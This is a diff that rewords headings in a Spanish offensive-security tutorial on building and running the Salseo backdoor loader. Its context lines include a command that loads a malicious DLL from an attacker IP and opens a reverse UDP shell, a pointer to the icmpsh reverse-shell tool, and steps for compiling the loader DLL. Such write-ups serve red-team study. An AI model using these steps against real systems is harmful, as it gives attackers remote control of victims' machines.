@@ -67,7 +67,7 @@ SalseoLoader.exe password \\<Attacker-IP>/folder/evilsalsa.dll.txt reverseudp <A
 
 **Esta vez necesitas una herramienta especial en el cliente para recibir el shell reverso. Descarga:** [**https://github.com/inquisb/icmpsh**](https://github.com/inquisb/icmpsh)
 
-#### **Desactivar las respuestas ICMP:**
+#### **Desactivar respuestas ICMP:**
 ```
 sysctl -w net.ipv4.icmp_echo_ignore_all=1
 
@@ -90,13 +90,13 @@ Abre el proyecto SalseoLoader usando Visual Studio.
 
 ![](<../.gitbook/assets/image (409).png>)
 
-### Instalar DllExport para este proyecto
+### Instala DllExport para este proyecto
 
 #### **Herramientas** --> **Administrador de paquetes NuGet** --> **Administrar paquetes NuGet para la solución...**
 
 ![](<../.gitbook/assets/image (881).png>)
 
-#### **Buscar el paquete DllExport (usando la pestaña Buscar) y presionar Instalar (y aceptar el popup)**
+#### **Busca el paquete DllExport (usando la pestaña Examinar), y presiona Instalar (y acepta el popup)**
 
 ![](<../.gitbook/assets/image (100).png>)
 
@@ -108,7 +108,7 @@ Presiona **Desinstalar** (sí, es raro pero confía en mí, es necesario)
 
 ![](<../.gitbook/assets/image (97).png>)
 
-### **Salir de Visual Studio y ejecutar DllExport\_configure**
+### **Sal de Visual Studio y ejecuta DllExport\_configure**
 
 Simplemente **sal** de Visual Studio
 
@@ -124,7 +124,7 @@ Selecciona **x64** (si vas a usarlo dentro de una caja x64, ese fue mi caso), se
 
 ![](<../.gitbook/assets/image (670).png>)
 
-### Compilar la solución
+### Compila la solución
 
 Selecciona **Tipo de salida = Biblioteca de clases** (Proyecto --> Propiedades de SalseoLoader --> Aplicación --> Tipo de salida = Biblioteca de clases)
 
@@ -136,7 +136,7 @@ Selecciona **plataforma x64** (Proyecto --> Propiedades de SalseoLoader --> Comp
 
 Para **compilar** la solución: Compilar --> Compilar solución (Dentro de la consola de salida aparecerá la ruta de la nueva DLL)
 
-### Probar la Dll generada
+### Prueba la Dll generada
 
 Copia y pega la Dll donde quieras probarla.
 
